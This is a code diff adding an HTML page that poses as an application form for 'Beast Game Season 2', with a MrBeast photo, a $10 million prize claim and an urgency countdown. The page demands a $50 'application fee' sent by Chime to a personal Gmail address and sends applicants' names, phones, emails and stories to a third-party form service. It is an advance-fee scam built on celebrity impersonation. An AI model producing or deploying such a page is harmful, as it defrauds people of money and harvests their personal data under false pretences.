@@ -1,0 +1,77 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Beast Game Season 2 Application</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #111;
+      color: #fff;
+      padding: 20px;
+      text-align: center;
+    }
+    .container {
+      max-width: 700px;
+      margin: auto;
+      background: #222;
+      padding: 20px;
+      border-radius: 10px;
+    }
+    input, textarea {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: none;
+      border-radius: 5px;
+    }
+    button {
+      padding: 10px 20px;
+      background: #ff3366;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    .countdown {
+      font-size: 24px;
+      font-weight: bold;
+      margin: 20px 0;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Apply for Beast Game Season 2! (Greenville)</h1>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/0d/MrBeast_Portrait.png/800px-MrBeast_Portrait.png" alt="MrBeast" style="width:200px; border-radius: 10px;">
+    <h2>💰 Grand Prize: $10 MILLION</h2>
+    <div class="countdown" id="countdown"></div>
+    <p><strong>$50 Application Fee Required</strong><br>Send via <strong>Chime</strong> to: <strong>billm741@gmail.com</strong></p>
+    <form action="https://formspree.io/f/mwkgzngr" method="POST">
+      <input type="text" name="name" placeholder="Full Name" required />
+      <input type="tel" name="phone" placeholder="Phone Number" required />
+      <input type="email" name="email" placeholder="Email Address" required />
+      <textarea name="story" placeholder="Why should you be picked for Beast Game?" rows="5" required></textarea>
+      <button type="submit">Submit Application</button>
+    </form>
+    <p>After submitting, you’ll receive a confirmation screen. Your answers will be reviewed.</p>
+  </div>
+  <script>
+    // Countdown Timer Script
+    const countdown = () => {
+      const endDate = new Date("August 1, 2025 23:59:59").getTime();
+      const now = new Date().getTime();
+      const timeLeft = endDate - now;
+      const days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
+      const hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+      const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
+      const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);
+      document.getElementById("countdown").innerHTML =
+        `⏳ Applications Close In: ${days}d ${hours}h ${minutes}m ${seconds}s`;
+    };
+    setInterval(countdown, 1000);
+  </script>
+</body>
+</html>
